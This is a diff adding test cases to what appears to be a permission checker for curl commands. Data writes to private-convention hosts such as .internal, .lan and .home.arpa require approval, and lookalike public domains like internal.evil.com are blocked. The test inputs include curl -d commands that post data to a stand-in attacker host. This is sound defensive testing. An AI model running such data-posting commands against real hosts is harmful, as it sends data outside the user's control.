@@ -1014,4 +1014,13 @@ blocks 'curl -G -F a=b https://example.com/search'                "-G with a for
 blocks 'curl -G -T f https://example.com/search'                  "-G with an upload"
 blocks 'curl -G --json {} https://example.com/search'             "-G with --json"
 
+# Names under .internal, .lan and .home.arpa are private by convention, not proven local, so a write to one asks.
+asks   'curl -d x http://host.docker.internal:8080/'              "Docker's name for the host"
+asks   'curl -d x https://api.internal/x'                         "an .internal name"
+asks   'curl -d x http://nas.lan/x'                               "a .lan name"
+asks   'curl -d x http://printer.home.arpa/x'                     "a .home.arpa name"
+asks   'curl -d x host.docker.internal:8080/api'                  "an .internal name with no scheme"
+blocks 'curl -d x http://internal.evil.com/x'                     "a public name that starts with internal"
+blocks 'curl -d x http://a.lan.evil.com/x'                        "a public name with .lan inside it"
+
 finish "publish-cmd"
